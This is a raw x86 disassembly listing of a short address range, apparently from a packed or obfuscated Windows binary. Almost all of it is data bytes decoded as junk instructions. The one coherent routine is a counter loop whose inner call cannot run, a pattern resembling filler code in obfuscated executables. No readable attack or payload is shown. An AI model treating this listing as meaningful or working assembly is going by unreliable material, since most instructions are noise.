  4159a4:	fbld   TBYTE PTR [esi+0x7fb1ba51]
  4159aa:	ja     0x415941
  4159ac:	add    ecx,DWORD PTR [ebp-0x1d6c8318]
  4159b2:	add    BYTE PTR [eax+0x35a73958],dl
  4159b8:	jle    0x41594d
  4159ba:	xor    DWORD PTR [ebp+edi*1+0x724fb4e6],ebx
  4159c1:	nop
  4159c2:	dec    esp
  4159c3:	std    
  4159c4:	mov    dh,0xe2
  4159c6:	mov    BYTE PTR [esi],al
  4159c8:	pop    ebp
  4159c9:	cmp    al,0x6f
  4159cb:	retf   
  4159cc:	jns    0x415990
  4159ce:	xchg   bh,dh
  4159d0:	mov    eax,0x7826851f
  4159d5:	out    dx,eax
  4159d6:	jle    0x415a3d
  4159d8:	dec    edx
  4159d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4159da:	pop    es
  4159db:	pop    eax
  4159dc:	es ins BYTE PTR es:[edi],dx
  4159de:	pop    ds
  4159df:	sbb    DWORD PTR [ebx+0x12c04e64],esp
  4159e5:	fidiv  WORD PTR [eax]
  4159e7:	mov    ebx,0xa447f1f8
  4159ec:	arpl   WORD PTR [ebx],di
  4159ee:	ret    
  4159ef:	lahf   
  4159f0:	dec    eax
  4159f1:	jmp    0x6ba3465e
  4159f6:	mov    edx,0x3d13cbe5
  4159fb:	sti    
  4159fc:	out    0x8c,eax
  4159fe:	sbb    DWORD PTR [ecx-0x5478aaf5],esp
  415a04:	rcr    BYTE PTR [ebp+0x37],cl
  415a07:	jb     0x41599b
  415a09:	push   ebp
  415a0a:	sar    BYTE PTR [edi+0x5d],1
  415a0d:	sahf   
  415a0e:	cli    
  415a0f:	mov    esp,0x123d0ac9
  415a14:	std    
  415a15:	fsubr  QWORD PTR [eax]
  415a17:	cld    
  415a18:	scas   al,BYTE PTR es:[edi]
  415a19:	ds inc esp
  415a1b:	out    dx,eax
  415a1c:	cmp    eax,0xf5ebf8b9
  415a21:	ds in  al,0xe6
  415a24:	dec    edx
  415a25:	inc    ebx
  415a26:	lock mov bl,0x38
  415a29:	push   0xf9a703cb
  415a2e:	push   edx
  415a2f:	mov    edx,esp
  415a31:	fisubr DWORD PTR [esi-0x2370d904]
  415a37:	inc    edx
  415a38:	scas   eax,DWORD PTR es:[edi]
  415a39:	neg    BYTE PTR [esi+0x2056c8dc]
  415a3f:	mov    dl,0xaa
  415a41:	push   esi
  415a42:	push   esp
  415a43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415a44:	pop    eax
  415a45:	jge    0x4159e1
  415a47:	popa   
  415a48:	ins    DWORD PTR es:[edi],dx
  415a49:	push   0x24
  415a4b:	or     ah,ah
  415a4d:	sub    eax,0x59cf525c
  415a52:	push   ds
  415a53:	leave  
  415a54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a55:	pop    ebp
  415a56:	jp     0x415a7c
  415a58:	(bad)  
  415a59:	fs pop edi
  415a5b:	imul   eax,DWORD PTR [esi],0xbdc42358
  415a61:	xor    eax,0x5d749fe2
  415a66:	xchg   DWORD PTR [eax],edi
  415a68:	adc    edx,eax
  415a6a:	jno    0x415aeb
  415a6c:	in     al,dx
  415a6d:	(bad)  
  415a6e:	mov    edx,0xfe3f8a6d
  415a73:	pushf  
  415a74:	and    al,BYTE PTR [esi+ecx*1]
  415a77:	retf   
  415a78:	jp     0x415a7e
  415a7a:	jbe    0x415a7d
  415a7c:	sar    BYTE PTR [ebx-0x24],cl
  415a7f:	inc    edx
  415a80:	jmp    0x415aa4
  415a82:	inc    ebx
  415a83:	jb     0x415a98
  415a85:	imul   ebx,DWORD PTR [edx+edi*4],0xffffffe4
  415a89:	pop    edx
  415a8a:	inc    ebx
  415a8b:	(bad)  [esp+ebp*2+0x48]
  415a8f:	sbb    bl,BYTE PTR [ecx-0x208430a6]
  415a95:	call   FWORD PTR [eax+0x11975c0f]
  415a9b:	add    BYTE PTR [eax],ch
  415a9d:	fdivr  QWORD PTR [edx-0x16]
  415aa0:	rol    BYTE PTR [eax],cl
  415aa2:	mov    cl,0x40
  415aa4:	icebp  
  415aa5:	call   0xf62b0121
  415aaa:	adc    dl,BYTE PTR [edx]
  415aac:	inc    edi
  415aad:	cmp    al,0x41
  415aaf:	lea    ecx,[eax+edi*2]
  415ab2:	(bad)  
  415ab3:	(bad)  
  415ab4:	xor    eax,0x3b9e3fc4
  415ab9:	cmp    edx,ebx
  415abb:	outs   dx,BYTE PTR es:[esi]
  415abd:	mov    cl,0x25
  415abf:	push   edi
  415ac0:	push   ecx
  415ac1:	fptan  
  415ac3:	sub    BYTE PTR [edx+0x2350fbd5],bh
  415ac9:	enter  0x9e75,0xc0
  415acd:	dec    ebp
  415ace:	add    eax,0xd81e95fc
  415ad3:	fsub   QWORD PTR [edi+0x4e6c3fda]
  415ad9:	outs   dx,BYTE PTR ds:[esi]
  415ada:	bound  eax,QWORD PTR [edx-0x52]
  415add:	daa    
  415ade:	popf   
  415adf:	sub    bl,cl
  415ae1:	ss nop
  415ae3:	or     al,0x4e
  415ae5:	outs   dx,BYTE PTR ds:[esi]
  415ae6:	in     eax,0x61
  415ae8:	mov    al,ds:0x68c84160
  415aed:	pop    ecx
  415aee:	inc    edi
  415aef:	aaa    
  415af0:	dec    edi
  415af1:	xchg   edx,eax
  415af2:	cmp    DWORD PTR [edx+ecx*1-0x42f5e02],0xcec501a2
  415afd:	js     0x415ac2
  415aff:	int    0x4b
  415b01:	xor    BYTE PTR [ebx-0x1],ah
  415b04:	gs push ecx
  415b06:	lahf   
  415b07:	mov    eax,ds:0x5467247b
  415b0c:	inc    esp
  415b0d:	rol    BYTE PTR [ebx-0x66a07933],cl
  415b13:	and    BYTE PTR [edx],0x94
  415b16:	jp     0x415ad7
  415b18:	fiadd  DWORD PTR [ecx+0x3dd7e4d7]
  415b1e:	pop    es
  415b1f:	jp     0x415b69
  415b21:	stos   BYTE PTR es:[edi],al
  415b22:	je     0x415b9b
  415b24:	pushf  
  415b25:	fst    QWORD PTR [ecx+0xb8a0a32]
  415b2b:	and    eax,0x8ae94944
  415b30:	in     eax,dx
  415b31:	fcomi  st,st(5)
  415b33:	inc    ebp
  415b34:	int3   
  415b35:	pop    edi
  415b36:	lods   eax,DWORD PTR ds:[esi]
  415b37:	call   0x88d6:0x330c558b
  415b3e:	mov    WORD PTR [edx],es
  415b40:	(bad)  [edx+0x32]
  415b43:	add    BYTE PTR [ebx-0x39ccf3bb],cl
  415b49:	add    eax,edi
  415b4b:	pop    edi
  415b4c:	pop    esi
  415b4d:	pop    ebx
  415b4e:	leave  
  415b4f:	ret    0x8
  415b52:	push   ebp
  415b53:	mov    ebp,esp
  415b55:	push   ecx
  415b56:	and    DWORD PTR ds:0x42701c,0x0
  415b60:	jmp    0x415b70
  415b65:	mov    eax,ds:0x42701c
  415b6a:	inc    eax
  415b6b:	mov    ds:0x42701c,eax
  415b70:	cmp    DWORD PTR ds:0x42701c,0x1b
  415b77:	jae    0x415bbd
  415b7d:	cmp    DWORD PTR ds:0x42701c,0x25
  415b84:	jne    0x415bb8
  415b8a:	push   0x5668
  415b8f:	push   DWORD PTR [ebp-0x24]
  415b92:	push   DWORD PTR [ebp-0x10]
  415b95:	push   DWORD PTR [ebp-0x20]
  415b98:	push   0x7cb6
  415b9d:	push   DWORD PTR [ebp-0x24]
  415ba0:	push   0x559a
  415ba5:	push   0x4b12
  415baa:	push   0x6519
  415baf:	push   DWORD PTR [ebp-0x28]
  415bb2:	call   DWORD PTR ds:0x421030
  415bb8:	jmp    0x415b65
  415bbd:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  415bc4:	adc    DWORD PTR ds:0x428008,ecx
  415bca:	mov    eax,DWORD PTR [ebp+0x8]
  415bcd:	add    DWORD PTR ds:0x425010,0x223f
  415bd7:	jmp    0x417f24
  415bdc:	into   
  415bdd:	or     al,0x6c
  415bdf:	jg     0x415c4d
  415be1:	fild   QWORD PTR [ebp-0x75]
  415be4:	dec    ebx
  415be5:	mov    ebp,0x229318bc
  415bea:	push   ebp
  415beb:	fimul  WORD PTR ds:0x52626147
  415bf1:	pop    edi
  415bf2:	bound  esp,QWORD PTR [edx+0x5e]
  415bf5:	and    al,0x5e
  415bf7:	and    al,0x47
  415bf9:	rol    DWORD PTR [eax+0x3af14d6],0x89
  415c00:	cmp    esp,DWORD PTR [ecx]
  415c02:	call   0x25e5:0x73fa65db
  415c09:	xchg   esi,eax
  415c0a:	(bad)  
  415c0b:	(bad)  
  415c0c:	cmp    esp,DWORD PTR [eax+0x4e0823b5]
  415c12:	cdq    
  415c13:	sub    eax,0x13e7e25a
  415c18:	mov    ecx,0x214bb7c5
  415c1d:	jb     0x415c31
  415c1f:	test   eax,0xd49f8ff2
  415c24:	repnz loope 0x415c48
  415c27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c28:	dec    esp
  415c29:	rol    dl,0xcc
  415c2c:	fmul   DWORD PTR [edi]
  415c2e:	addr16 mov ecx,0x8cbcda8c
  415c34:	dec    ecx
  415c35:	mov    WORD PTR [edi+0x36],ds
  415c38:	scas   eax,DWORD PTR es:[edi]
  415c39:	addr16 mov esi,0x7e92e88f
  415c3f:	cli    
  415c40:	jb     0x415c11
  415c42:	cmp    DWORD PTR [ebp+0x2ea97fb2],eax
  415c48:	(bad)  
  415c49:	push   ebx
  415c4a:	shl    DWORD PTR [ebx-0x6c],cl
  415c4d:	idiv   BYTE PTR [edx]
  415c4f:	inc    edx
  415c50:	xchg   esp,eax
  415c51:	in     eax,0x90
  415c53:	test   bh,ah
  415c55:	shl    al,cl
  415c57:	mov    edx,0xc8f0cb1e
  415c5c:	cmp    eax,0xf7a1a6ab
  415c61:	xchg   eax,ecx
  415c63:	hlt    
  415c64:	inc    eax
  415c65:	arpl   WORD PTR [eax],cx
  415c67:	mov    eax,0xaa1ae162
  415c6c:	pop    edi
  415c6d:	and    DWORD PTR ds:0xb82a6e62,0xffffffa2
  415c74:	xchg   edx,eax
  415c75:	ins    DWORD PTR es:[edi],dx
  415c76:	ins    BYTE PTR es:[edi],dx
  415c77:	sti    
  415c78:	xchg   BYTE PTR [esi+0x3849d939],cl
  415c7e:	fsubr  st,st(7)
  415c80:	add    ch,BYTE PTR [edx]
  415c82:	adc    eax,0x619e7885
  415c87:	pop    eax
  415c88:	xor    ch,0x7
  415c8b:	and    DWORD PTR [edx],ebp
  415c8d:	imul   ebx,DWORD PTR [esi-0x4560bc85],0x3b
  415c94:	bound  esp,QWORD PTR [ecx+eax*1-0x27d5a961]
  415c9b:	test   eax,0xa7dbddfd
  415ca0:	mov    al,0x90
  415ca2:	int3   
  415ca3:	(bad)  [edi+0x75]
  415ca6:	retf   0xd96c
  415ca9:	mov    ecx,0x71f095ca
  415cae:	jo     0x415cb4
  415cb0:	cs cmp eax,0xfd7ab805
  415cb6:	push   edx
  415cb7:	stos   DWORD PTR es:[edi],eax
  415cb8:	stos   DWORD PTR es:[edi],eax
  415cb9:	pop    edi
  415cba:	dec    edi
  415cbb:	xchg   ecx,eax
  415cbc:	push   edx
  415cbd:	dec    edi
  415cbe:	cmp    al,0x31
  415cc0:	or     eax,0xa5df4b0a
  415cc5:	xor    DWORD PTR [edi],eax
  415cc7:	(bad)  
  415cc8:	mov    edx,0xc7437f37
  415ccd:	lods   al,BYTE PTR ds:[esi]
  415cce:	and    DWORD PTR [esi+0x56],ecx
  415cd1:	nop
  415cd2:	(bad)  
  415cd3:	rol    ecx,cl
  415cd5:	lds    edx,FWORD PTR [ebp+0x5d]
  415cd8:	mov    eax,0x8eec84ed
  415cdd:	xchg   ebx,eax
  415cde:	loop   0x415d2c
  415ce0:	into   
  415ce1:	sub    al,0xbd
  415ce3:	nop
  415ce4:	aaa    
  415ce5:	jne    0x415d3b
  415ce7:	repz xchg ebx,eax
  415ce9:	div    BYTE PTR [eax+0x6]
  415cec:	retf   
  415ced:	sbb    DWORD PTR [esi+0x1f],ebp
  415cf0:	fst    QWORD PTR [ecx+0x41]
  415cf3:	jne    0x415d09
  415cf5:	ins    BYTE PTR es:[edi],dx
  415cf6:	mov    eax,ds:0xda74aeac
  415cfb:	aaa    
  415cfc:	stos   BYTE PTR es:[edi],al
  415cfd:	sar    BYTE PTR [ecx-0x25680ed7],0x96
  415d04:	fimul  DWORD PTR ds:0x30467ec8
  415d0a:	test   DWORD PTR [esi],ecx
  415d0c:	or     ch,BYTE PTR [ebx+ebx*8+0x5e]
  415d10:	add    dl,bl
  415d12:	cs retf 0x7b33
  415d16:	iret   
  415d17:	inc    esi
  415d18:	sbb    BYTE PTR [esi+0x17a03c04],ch
  415d1e:	push   edx
  415d1f:	xchg   ebx,eax
  415d20:	je     0x415d37
  415d22:	sub    edi,ecx
  415d24:	xor    eax,0x682b6018
  415d29:	jns    0x415cba
  415d2b:	nop
  415d2c:	mov    esp,0xa7dc38f2
  415d31:	or     al,0xed
  415d33:	call   0xe10be352
  415d38:	sbb    bh,BYTE PTR [edi]
  415d3a:	mov    al,0x21
  415d3c:	test   BYTE PTR [edi-0x2ac32186],ch
  415d42:	call   0x52436ff3
  415d47:	outs   dx,BYTE PTR ds:[esi]
  415d48:	mov    edx,0x79847f93
  415d4d:	fsubr  QWORD PTR [esi]
  415d4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d50:	or     ebx,DWORD PTR [esi-0x6a0f21be]
  415d56:	out    dx,eax
  415d57:	es dec dx
  415d5a:	xor    edx,ecx
  415d5c:	dec    esp
  415d5d:	jbe    0x415dcd
  415d5f:	sti    
  415d60:	js     0x415d6e
  415d62:	xchg   esi,eax
  415d63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d64:	fstp   QWORD PTR [ecx+0x1d]
  415d67:	ret    0x8a08
  415d6a:	push   es
  415d6b:	add    al,0xb8
  415d6d:	mov    DWORD PTR [edi-0x4a],ebx
  415d70:	jmp    0xf880:0xa4c8b8c
  415d77:	clc    
  415d78:	xor    ebp,ebp
  415d7a:	mov    ch,0xe4
  415d7c:	(bad)  
  415d7d:	fldenv [ebx+eiz*1-0x71]
  415d81:	and    al,0x72
  415d83:	or     al,0x44
  415d85:	push   ss
  415d86:	les    edx,FWORD PTR ds:[ecx+eiz*4+0x5e18eb95]
  415d8e:	fnstcw WORD PTR [eax+0x5b]
  415d91:	test   bh,dh
  415d93:	jb     0x415d99
  415d95:	or     al,dh
  415d97:	fcom   st(7)
  415d99:	pop    ds
  415d9a:	in     eax,dx
  415d9b:	jbe    0x415d41
  415d9d:	imul   esp,DWORD PTR [ebp+0x4e],0x59
  415da1:	test   BYTE PTR [edi],cl
  415da3:	inc    esi
  415da4:	and    DWORD PTR [edi-0x184432e],edx
  415daa:	push   edi
  415dab:	jle    0x415d48
  415dad:	add    DWORD PTR ds:0x1d767413,edi
  415db3:	imul   edx,DWORD PTR [ebx-0x2af056d0],0x25c565c0
  415dbd:	xor    bh,BYTE PTR [edi]
  415dbf:	pusha  
  415dc0:	js     0x415dbf
  415dc2:	xchg   edi,eax
  415dc3:	cwde   
  415dc4:	es jno 0x415d57
  415dc7:	inc    ecx
  415dc8:	push   0x5b
  415dca:	add    DWORD PTR [edi],0x4f1bc617
  415dd0:	imul   esi,DWORD PTR [esi-0x4cc7c1c],0x4bb8bbe4
  415dda:	ss std 
  415ddc:	jae    0x415d8a
  415dde:	je     0x415db1
  415de0:	fidivr WORD PTR [esi+eiz*2-0x4b]
  415de4:	jae    0x415ddd
  415de6:	ins    BYTE PTR es:[edi],dx
  415de7:	inc    esp
  415de8:	xor    eax,0x8339ccb9
  415ded:	mov    ch,0xc4
  415def:	and    eax,0x94cdb14b
  415df4:	(bad)  
  415df5:	fst    QWORD PTR [edx-0x6c]
  415df8:	jmp    0x415e2e
  415dfa:	dec    esi
  415dfb:	test   eax,0x862878e5
  415e00:	cwde   
  415e01:	fnstenv [esi+0x504d576c]
  415e07:	mov    al,ds:0x5e30d363
  415e0c:	sahf   
  415e0d:	cmp    eax,ebx
  415e0f:	daa    
  415e10:	xchg   ecx,eax
  415e11:	aaa    
  415e12:	mov    ds:0xacb22fa8,al
  415e17:	fwait
  415e18:	or     DWORD PTR [ebp+0x57f14da3],edi
  415e1e:	mov    eax,0xb5c08a9
  415e23:	out    dx,eax
  415e24:	and    WORD PTR [eax],bx
  415e27:	and    al,0x60
  415e29:	cmp    eax,0x279fc246
  415e2e:	arpl   WORD PTR [edx],bx
  415e30:	sbb    BYTE PTR [ebx+edx*4-0x15],bh
  415e34:	mov    bl,0x19
  415e36:	and    dl,BYTE PTR [ecx]
  415e38:	xchg   edi,eax
  415e39:	dec    bx
  415e3b:	or     DWORD PTR gs:[ecx-0x48c198fc],esp
  415e42:	add    al,0x26
  415e44:	mov    esi,0x8031f0c
  415e49:	stos   BYTE PTR es:[edi],al
  415e4a:	pop    esi
  415e4b:	xchg   edx,eax
  415e4c:	cdq    
  415e4d:	aad    0x8
  415e4f:	xlat   BYTE PTR ds:[ebx]
  415e50:	fdivr  st(5),st
  415e52:	push   eax
  415e53:	aam    0xbc
  415e55:	adc    BYTE PTR [ebx+edi*2-0x63],ah
  415e59:	stos   DWORD PTR es:[edi],eax
  415e5a:	test   eax,0xe543f024
  415e5f:	inc    ebx
  415e60:	inc    ebp
  415e61:	pop    ebx
  415e62:	or     DWORD PTR [ebx+0x4e],esp
  415e65:	les    edi,FWORD PTR [esi+0x7b]
  415e68:	jmp    0x55387bd7
  415e6d:	jle    0x415e70
  415e6f:	je     0x415e26
  415e71:	xchg   edi,eax
  415e72:	sti    
  415e73:	dec    DWORD PTR [edx]
  415e75:	jmp    0x877cdeb1
  415e7a:	xchg   esi,eax
  415e7b:	add    eax,0x49f8b5e6
  415e80:	ja     0x415ef3
  415e82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415e83:	and    bh,BYTE PTR [edi+edi*4]
  415e86:	cld    
  415e87:	iret   
  415e88:	fwait
  415e89:	mov    eax,ds:0x24eee79
  415e8e:	pop    ecx
  415e8f:	icebp  
  415e90:	cld    
  415e91:	lods   eax,DWORD PTR ds:[esi]
  415e92:	test   BYTE PTR [esi-0x31],bl
  415e95:	sub    DWORD PTR ds:0xdd3ffeb4,esp
  415e9b:	and    al,0xd1
  415e9d:	pop    ebx
  415e9e:	pop    ebx
  415e9f:	andps  xmm7,xmm1
  415ea2:	jle    0x415e31
  415ea4:	mov    al,BYTE PTR [edx+esi*8]
  415ea7:	outs   dx,BYTE PTR ds:[esi]
  415ea8:	repnz inc ebx
  415eaa:	sbb    eax,0xba9649d7
  415eaf:	push   edx
  415eb0:	sub    BYTE PTR [ecx+0x39],bl
  415eb3:	lods   al,BYTE PTR ds:[esi]
  415eb4:	out    dx,eax
  415eb5:	aas    
  415eb6:	mov    eax,ds:0x35f62dc7
  415ebb:	or     ah,BYTE PTR [ebx]
  415ebd:	or     eax,0x3d15a3e9
  415ec2:	scas   al,BYTE PTR es:[edi]
  415ec3:	push   ebx
  415ec4:	inc    ebp
  415ec5:	cmp    eax,DWORD PTR [esi-0x78]
  415ec8:	es inc ebp
  415eca:	leave  
  415ecb:	push   ebx
  415ecc:	mov    dl,0x3
  415ece:	ins    BYTE PTR es:[edi],dx
  415ecf:	or     dl,BYTE PTR [esi+ecx*1]
  415ed2:	sbb    DWORD PTR [ebx-0x62],0x40
  415ed6:	out    0xa2,al
  415ed8:	and    cl,ch
  415eda:	xchg   esp,eax
  415edb:	rol    DWORD PTR [eax],cl
  415edd:	mov    edi,0x1e657e0
  415ee2:	popa   
  415ee3:	bound  edx,QWORD PTR [ebp-0x47]
  415ee6:	sub    DWORD PTR [esi+0xc],edx
  415ee9:	xor    bl,BYTE PTR [eax]
  415eeb:	cmp    eax,0x802f3e69
  415ef0:	or     DWORD PTR [eax+0x4aaa330b],ebx
  415ef6:	lds    edx,FWORD PTR [ebp+0x53]
  415ef9:	push   ebp
  415efa:	ficom  WORD PTR [esi-0x498e4511]
  415f00:	add    ebx,DWORD PTR [eax]
  415f02:	jne    0x415f58
  415f04:	fadd   st(7),st
  415f06:	cmp    edx,DWORD PTR [esi+0x6d0b460a]
  415f0c:	inc    edx
  415f0d:	sub    al,0xc0
  415f0f:	shl    DWORD PTR [esi+0x270d4aea],0xf9
  415f16:	(bad)  
  415f17:	retf   
  415f18:	xor    bh,BYTE PTR [esi+0x1eabab50]
  415f1e:	fnstsw WORD PTR [ebp+0x633005b8]
  415f24:	cmp    al,0x63
  415f26:	dec    eax
  415f27:	nop
  415f28:	out    0x8b,al
  415f2a:	fcmovnb st,st(0)
  415f2c:	mov    ebx,0x13a459d6
  415f31:	xor    DWORD PTR [esi-0x26],esi
  415f34:	inc    esp
  415f35:	xor    bl,BYTE PTR [ebp-0x7f]
  415f38:	add    BYTE PTR [esi-0x7a],cl
  415f3b:	sbb    esi,DWORD PTR [esi]
  415f3d:	add    BYTE PTR [eax+0x7b953acf],ah
  415f43:	mov    esi,0xd0890216
  415f48:	dec    esi
  415f49:	das    
  415f4a:	pop    edx
  415f4b:	fcom   DWORD PTR [esi-0x6e]
  415f4e:	pop    esp
  415f4f:	dec    edx
  415f50:	(bad)  
  415f51:	mov    ebp,0xd93b948c
  415f56:	nop
  415f57:	or     ebx,ebx
  415f59:	ret    
  415f5a:	lds    edx,FWORD PTR [ebp-0x7b]
  415f5d:	ror    DWORD PTR [ebx+0x1a],0x77
  415f61:	xchg   BYTE PTR [eax],bh
  415f63:	inc    ecx
  415f64:	cmp    DWORD PTR [edx-0x5],edx
  415f67:	imul   esi,DWORD PTR [esi+0x6cf1d4ba],0xb09044d5
  415f71:	sub    DWORD PTR [edx-0xc7ace89],edi
  415f77:	adc    al,0xf
  415f79:	pop    edx
  415f7a:	sub    BYTE PTR [edx-0x6],al
  415f7d:	mov    esi,0xe0d7cbe3
  415f82:	scas   eax,DWORD PTR es:[edi]
  415f83:	nop
  415f84:	add    al,0xd8
  415f86:	xchg   ebp,eax
  415f87:	test   al,0xac
  415f89:	or     ebp,DWORD PTR [ebx+ecx*1-0x77]
  415f8d:	xor    DWORD PTR [ebx],eax
  415f8f:	leave  
  415f90:	scas   eax,DWORD PTR es:[edi]
  415f91:	int    0x4b
  415f93:	mov    eax,ds:0x233023db
  415f98:	push   esp
  415f99:	loopne 0x415f45
  415f9b:	(bad)  
  415f9c:	jg     0x415f98
  415f9e:	mov    edx,0xbf86e0fe
  415fa3:	stos   BYTE PTR es:[edi],al
  415fa4:	pop    esp
  415fa5:	out    0x4e,eax
  415fa7:	jmp    0x22408cd2
  415fac:	inc    ecx
  415fad:	aaa    
  415fae:	mov    edx,0x78a0460b
  415fb3:	cs in  eax,dx
  415fb5:	adc    DWORD PTR [eax],ecx
  415fb7:	jne    0x415f74
  415fb9:	adc    eax,DWORD PTR [esi+0x20]
  415fbc:	pop    ecx
  415fbd:	pop    edi
  415fbe:	jp     0x41600b
  415fc0:	lds    edx,FWORD PTR [ebx-0x14f4fe8c]
  415fc6:	fist   WORD PTR [esi+ecx*8+0x4b]
  415fca:	add    cl,dh
  415fcc:	mov    ah,0xf7
  415fce:	retf   
  415fcf:	imul   edi,DWORD PTR [eax-0x10],0x16
  415fd3:	scas   al,BYTE PTR es:[edi]
  415fd4:	out    0x68,al
  415fd6:	mov    BYTE PTR [esi-0x24],cl
  415fd9:	jmp    0x415f85
  415fdb:	inc    ebp
  415fdc:	mov    ch,0xb7
  415fde:	push   ebp
  415fdf:	pushf  
  415fe0:	test   dh,bl
  415fe2:	push   eax
  415fe3:	dec    ecx
  415fe4:	push   esi
  415fe5:	push   esp
  415fe6:	ret    0x89f4
  415fe9:	pop    esp
  415fea:	jb     0x415fe5
  415fec:	repnz jecxz 0x41605c
  415fef:	pop    ecx
  415ff0:	outs   dx,DWORD PTR ds:[esi]
  415ff1:	mov    bh,0x79
  415ff3:	stc    
  415ff4:	test   al,0xba
  415ff6:	or     bl,BYTE PTR [edi]
  415ff8:	pop    ebp
  415ff9:	adc    edi,DWORD PTR [eax-0x513cef8a]
  415fff:	add    ch,bl
  416001:	loopne 0x41601e
  416003:	inc    ebp
  416004:	mov    eax,0x84ca7450
  416009:	adc    ebx,0x1
  41600c:	mov    ebx,DWORD PTR [esi+0x58]
  41600f:	jmp    0x415f9b
  416011:	sbb    DWORD PTR [esi],edx
  416013:	xor    BYTE PTR [edx-0x5787530d],al
  416019:	test   al,0xe3
  41601b:	adc    DWORD PTR [edx-0x12ec98af],ebx
  416021:	adc    BYTE PTR [edi-0xa],ah
  416024:	hlt    
  416025:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416026:	in     eax,dx
  416027:	int    0xda
  416029:	sbb    DWORD PTR [bx+di],ecx
  41602c:	iret   
  41602d:	in     eax,0x4f
  41602f:	retf   0xdb66
  416032:	or     ebp,DWORD PTR [ecx-0x2f9a36e9]
  416038:	lds    esi,FWORD PTR [edx-0x6c919732]
  41603e:	ins    BYTE PTR es:[edi],dx
  41603f:	data16 out 0xc,al
  416042:	pushf  
  416043:	in     al,0x35
  416045:	lahf   
  416046:	retf   0xaf3a
  416049:	and    eax,DWORD PTR [edi-0x27]
  41604c:	jge    0x41606e
  41604e:	xor    BYTE PTR [edx],dl
  416050:	mov    ah,0xbb
  416052:	pop    esp
  416053:	jno    0x4160b7
  416055:	dec    edi
  416056:	mov    edi,0x31480133
  41605b:	push   0xffffffc1
  41605d:	pop    esi
  41605e:	into   
  41605f:	sbb    al,0x4a
  416061:	or     eax,0x10a95911
  416066:	mov    ebx,0xc17e7e5
  41606b:	xchg   BYTE PTR [ecx+esi*2],dl
  41606e:	iret   
  41606f:	pushf  
  416070:	xchg   ebx,eax
  416071:	jbe    0x41602e
  416073:	ret    0x7e7a
  416076:	lahf   
  416077:	add    al,BYTE PTR [eax+0x3b]
  41607a:	cmp    al,BYTE PTR [esi-0x7a]
  41607d:	adc    esi,DWORD PTR [edi-0x414a7653]
  416083:	loope  0x4160d7
  416085:	sti    
  416086:	ins    BYTE PTR es:[edi],dx
  416087:	popf   
  416088:	mov    ah,0x45
  41608a:	cld    
  41608b:	adc    ebx,ebx
  41608d:	in     eax,0xe3
  41608f:	gs mov bl,0x93
  416092:	inc    edi
  416093:	leave  
  416094:	aam    0x40
  416096:	into   
  416097:	xlat   BYTE PTR ds:[ebx]
  416098:	sbb    ch,BYTE PTR [edi-0xb]
  41609b:	inc    edx
  41609c:	mov    ebp,0x94bf3419
  4160a1:	dec    ecx
  4160a2:	sti    
  4160a3:	into   
  4160a4:	test   al,0x10
  4160a6:	in     eax,dx
  4160a7:	arpl   WORD PTR [eax+eiz*8-0x75],bp
  4160ab:	mov    ecx,edx
  4160ad:	jmp    0x45334df
  4160b2:	mov    edx,0xd1b47ac0
  4160b7:	add    bh,bh
  4160b9:	push   ebx
  4160ba:	cmp    eax,0x4698d9df
  4160bf:	dec    ebp
  4160c0:	fist   WORD PTR [edx+ebp*2+0x4b]
  4160c4:	dec    ebp
  4160c5:	pusha  
  4160c6:	sar    DWORD PTR [ebx-0x5b],1
  4160c9:	mov    cl,0x97
  4160cb:	jle    0x4160fe
  4160cd:	in     al,0xcf
  4160cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4160d0:	mov    cl,BYTE PTR [esi-0x54]
  4160d3:	outs   dx,BYTE PTR ds:[esi]
  4160d4:	lods   eax,DWORD PTR ds:[esi]
  4160d5:	or     DWORD PTR [edi-0x7a],esp
  4160d8:	push   es
  4160d9:	xchg   ebp,eax
  4160da:	sub    BYTE PTR [edi+eax*2],al
  4160dd:	jne    0x416128
  4160df:	adc    al,0x5
  4160e2:	inc    esp
  4160e3:	mov    esi,0xdfc2b461
  4160e8:	fbstp  TBYTE PTR [edx]
  4160ea:	int    0x6f
  4160ec:	add    ebx,esp
  4160ee:	xchg   ecx,eax
  4160ef:	add    ebp,0xfbd3a6e1
  4160f5:	aas    
  4160f6:	hlt    
  4160f7:	add    BYTE PTR [esp+edx*8+0x7595a985],0x4f
  4160ff:	arpl   WORD PTR [ebx+0x245d761c],cx
  416105:	sbb    eax,0xa8fd4a11
  41610a:	jle    0x4160d9
  41610c:	push   ds
  41610d:	lea    edi,[esp+edx*4+0x29f44273]
  416114:	lods   eax,DWORD PTR ds:[esi]
  416115:	neg    BYTE PTR [edx+ecx*1-0x11]
  416119:	clc    
  41611a:	push   0x41
  41611c:	mov    edi,0xadd727c4
  416121:	add    BYTE PTR [edx-0x66],al
  416124:	cmc    
  416125:	xchg   DWORD PTR [esi-0x4ec3e838],esi
  41612b:	popf   
  41612c:	inc    esp
  41612d:	lock jb 0x41619e
  416130:	or     al,0x31
  416132:	outs   dx,DWORD PTR ds:[esi]
  416133:	loop   0x4160c0
  416135:	mov    ds:0x38f66f87,eax
  41613a:	and    esi,edi
  41613c:	sahf   
  41613d:	dec    ebp
  41613e:	jecxz  0x416139
  416140:	jmp    0x3e5:0xb7d538d7
  416147:	ja     0x41612b
  416149:	jnp    0x416118
  41614b:	and    dh,BYTE PTR [ecx+0x6c]
  41614e:	lock push esp
  416150:	lods   eax,DWORD PTR ds:[esi]
  416151:	lock jmp 0x4160ff
  416154:	ret    0x5dd8
  416157:	cmp    bl,cl
  416159:	mov    bh,0x16
  41615b:	ret    0xb1d9
  41615e:	inc    edx
  41615f:	rcr    edi,1
  416161:	jnp    0x416197
  416163:	test   al,0x3f
  416165:	jp     0x41618a
  416167:	mov    eax,0xb25a9be6
  41616c:	ja     0x41616c
  41616e:	cmp    DWORD PTR [ebp+0x32c145ff],0x32
  416175:	ins    BYTE PTR es:[edi],dx
  416176:	outs   dx,DWORD PTR ds:[esi]
  416177:	jmp    0x4161df
  416179:	es es and al,0xb5
  41617d:	push   ebx
